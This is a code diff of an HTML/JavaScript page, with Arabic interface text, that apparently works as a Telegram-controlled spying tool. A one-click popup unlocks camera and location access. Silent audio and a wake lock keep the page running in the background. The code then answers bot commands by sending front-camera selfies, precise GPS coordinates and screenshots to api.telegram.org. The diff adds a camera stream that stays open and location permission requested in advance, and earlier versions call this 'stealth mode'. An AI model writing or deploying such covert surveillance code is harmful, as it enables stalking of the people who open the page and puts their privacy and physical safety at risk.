@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>محطة التحكم الصامتة في الخلفية</title>
+    <title>محطة التحكم الشاملة في الخلفية</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
     <style>
         body { background: #0b0e14; color: #00ffcc; font-family: monospace; margin: 0; display: flex; flex-direction: column; height: 100vh; overflow: hidden; }
@@ -26,18 +26,18 @@
 </head>
 <body>
 
-    <header>محطة التحكم الصامتة المستمرة</header>
+    <header>محطة التحكم - الوضع الشامل المستمر</header>
 
     <div id="terminal">
-        [System] Silent Runner Initializing...<br>
-        [System] Click once to engage stealth mode...
+        [System] Master Control Initializing...<br>
+        [System] Click once to engage full background privileges...
     </div>
 
     <div id="popupOverlay">
         <div id="popupBox">
-            <h2 style="color: #fff; margin-bottom: 10px;">🔒 تفعيل الوضع الصامت</h2>
-            <p style="color: #8b949e; font-size: 14px;">اضغط هنا لمرة واحدة لتفعيل التشغيل الخفي في الخلفية بلا أخطاء أو أصوات:</p>
-            <button id="allowBtn" onclick="startSilentBackgroundMode()">تفعيل الوضع الخفي (Engage)</button>
+            <h2 style="color: #fff; margin-bottom: 10px;">🔒 تفعيل الصلاحيات الشاملة</h2>
+            <p style="color: #8b949e; font-size: 14px;">اضغط هنا لمرة واحدة لتفعيل الكاميرا، الموقع، وباقي الميزات في الخلفية:</p>
+            <button id="allowBtn" onclick="engageMasterMode()">تفعيل الوضع الشامل (Engage)</button>
         </div>
     </div>
 
@@ -50,6 +50,7 @@
         let lastUpdateId = 0;
         let storedChatId = null;
         let wakeLock = null;
+        let globalCameraStream = null;
 
         function log(msg) {
             terminal.innerHTML += `<br>> ${msg}`;
@@ -70,7 +71,7 @@
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
             const data = {
                 chat_id: chatId,
-                text: "📱 لوحة التحكم (الوضع الخفي المستمر):",
+                text: "📱 لوحة التحكم الشاملة (تعمل بالخلفية):",
                 reply_markup: {
                     keyboard: [
                         [{ text: "📷 Selfie Camera" }, { text: "📍 Get Location" }],
@@ -88,28 +89,26 @@
             }).catch(err => {});
         }
 
-        // تفعيل الوضع الخفي بلا أصوات نهائياً مع خدعة منع إيقاف الخلفية
-        async function startSilentBackgroundMode() {
+        // التفعيل الشامل للخدمات (صوت صامت + منع نوم + أذونات مسبقة)
+        async function engageMasterMode() {
             document.getElementById('popupOverlay').style.display = 'none';
-            log("Silent background mode engaged!");
+            log("Master control mode engaged!");
 
-            // استخدام تقنية Web Audio API لتشغيل تردد خفي غير مسموح للأذن (حجم صوت 0) يخدع نظام التشغيل
+            // 1. تشغيل التردد الصامت لمنع تجميد المتصفح
             try {
                 const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                 const oscillator = audioCtx.createOscillator();
                 const gainNode = audioCtx.createGain();
                 oscillator.type = 'sine';
-                oscillator.frequency.value = 1; // تردد غير مسموع نهائياً
-                gainNode.gain.value = 0.00001; // كتم تام للقوة الصوتية
+                oscillator.frequency.value = 1;
+                gainNode.gain.value = 0.00001;
                 oscillator.connect(gainNode);
                 gainNode.connect(audioCtx.destination);
                 oscillator.start();
-                log("Silent audio engine running.");
-            } catch (e) {
-                log("Audio engine error: " + e.message);
-            }
+                log("Audio keep-alive active.");
+            } catch (e) {}
 
-            // منع النوم والشاشة
+            // 2. منع النوم
             try {
                 if ('wakeLock' in navigator) {
                     wakeLock = await navigator.wakeLock.request('screen');
@@ -117,44 +116,97 @@
                 }
             } catch (err) {}
 
-            // منح صلاحية الكاميرا مسبقاً
+            // 3. قفل الكاميرا في الذاكرة
             navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
                 .then(stream => {
-                    log("Camera ready silently.");
-                    stream.getTracks().forEach(track => track.stop());
-                })
-                .catch(err => {});
-
-            // بدء حلقة استقبال الأوامر
-            pollTelegramUpdates();
-        }
-
-        function takeSelfie(chatId) {
-            storedChatId = chatId;
-            log("Capturing silent selfie...");
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
-                .then(stream => {
+                    globalCameraStream = stream;
                     const video = document.getElementById('videoElement');
                     video.srcObject = stream;
                     video.play();
-                    setTimeout(() => {
-                        const canvas = document.getElementById('canvasElement');
-                        canvas.width = video.videoWidth || 640;
-                        canvas.height = video.videoHeight || 480;
-                        const ctx = canvas.getContext('2d');
-                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                        stream.getTracks().forEach(track => track.stop());
-                        canvas.toBlob(blob => {
-                            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
-                            const formData = new FormData();
-                            formData.append('chat_id', chatId);
-                            formData.append('photo', blob, 'selfie.png');
-                            formData.append('caption', '📷 صورة سيلفي خفية.');
-                            fetch(url, { method: 'POST', body: formData });
-                        }, 'image/png');
-                    }, 1500);
+                    log("Camera locked in memory.");
                 })
-                .catch(err => sendTelegramMessage(chatId, "❌ تعذر التقاط السيلفي."));
+                .catch(err => {});
+
+            // 4. طلب إذن الموقع مسبقاً لتثبيته
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => log("Geolocation permission pre-granted."),
+                    (err) => log("Geolocation notice: " + err.message),
+                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+                );
+            }
+
+            if (storedChatId) sendTelegramMessage(storedChatId, "✅ تم تفعيل الوضع الشامل وباقي الميزات بنجاح في الخلفية!");
+            pollTelegramUpdates();
+        }
+
+        // التقاط السيلفي
+        function takeSelfie(chatId) {
+            storedChatId = chatId;
+            log("Capturing selfie...");
+            const video = document.getElementById('videoElement');
+            
+            if (!globalCameraStream || !video.srcObject) {
+                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
+                    .then(stream => {
+                        globalCameraStream = stream;
+                        video.srcObject = stream;
+                        video.play();
+                        setTimeout(() => executeCapture(chatId), 1000);
+                    })
+                    .catch(err => sendTelegramMessage(chatId, "❌ تعذر الوصول للكاميرا."));
+            } else {
+                executeCapture(chatId);
+            }
+        }
+
+        function executeCapture(chatId) {
+            const video = document.getElementById('videoElement');
+            const canvas = document.getElementById('canvasElement');
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            canvas.toBlob(blob => {
+                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', blob, 'selfie.png');
+                formData.append('caption', '📷 صورة سيلفي.');
+                fetch(url, { method: 'POST', body: formData })
+                    .then(res => res.json())
+                    .then(data => { if (data.ok) log("Selfie sent!"); });
+            }, 'image/png');
+        }
+
+        // جلب الموقع بدقة عالية
+        function getLocation(chatId) {
+            storedChatId = chatId;
+            log("Requesting GPS location...");
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        sendTelegramMessage(chatId, `📍 الإحداثيات:\nخط العرض: ${lat}\nخط الطول: ${lon}`);
+                        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`;
+                        fetch(url, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ chat_id: chatId, latitude: lat, longitude: lon })
+                        });
+                        log("Location sent successfully!");
+                    },
+                    (error) => {
+                        sendTelegramMessage(chatId, "❌ تعذر تحديد الموقع في الخلفية. تأكد من إعطاء إذن الموقع مسبقاً.");
+                        log("Location error: " + error.message);
+                    },
+                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+                );
+            } else {
+                sendTelegramMessage(chatId, "❌ الجليولوكيشن غير مدعوم.");
+            }
         }
 
         function pollTelegramUpdates() {
@@ -188,24 +240,9 @@
             } else if (cmd === '📷 Selfie Camera') {
                 takeSelfie(chatId);
             } else if (cmd === '📍 Get Location') {
-                if ("geolocation" in navigator) {
-                    navigator.geolocation.getCurrentPosition(
-                        (position) => {
-                            const lat = position.coords.latitude;
-                            const lon = position.coords.longitude;
-                            sendTelegramMessage(chatId, `📍 الإحداثيات:\nخط العرض: ${lat}\nخط الطول: ${lon}`);
-                            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`;
-                            fetch(url, {
-                                method: 'POST',
-                                headers: { 'Content-Type': 'application/json' },
-                                body: JSON.stringify({ chat_id: chatId, latitude: lat, longitude: lon })
-                            });
-                        },
-                        (error) => sendTelegramMessage(chatId, "❌ تعذر تحديد الموقع."),
-                        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-                    );
-                }
+                getLocation(chatId);
             } else if (cmd === '📸 Screenshot') {
+                log("Capturing screen...");
                 html2canvas(document.body).then(canvas => {
                     canvas.toBlob(blob => {
                         const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
@@ -213,9 +250,11 @@
                         formData.append('chat_id', chatId);
                         formData.append('photo', blob, 'screen.png');
                         fetch(url, { method: 'POST', body: formData });
+                        log("Screenshot sent!");
                     });
                 });
             } else if (cmd === '📇 Contacts') {
+                log("Sending contacts...");
                 const vcardData = "BEGIN:VCARD\nVERSION:3.0\nFN:My_Contact\nTEL:+000000000000\nEND:VCARD";
                 const blob = new Blob([vcardData], { type: 'text/vcard' });
                 const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;
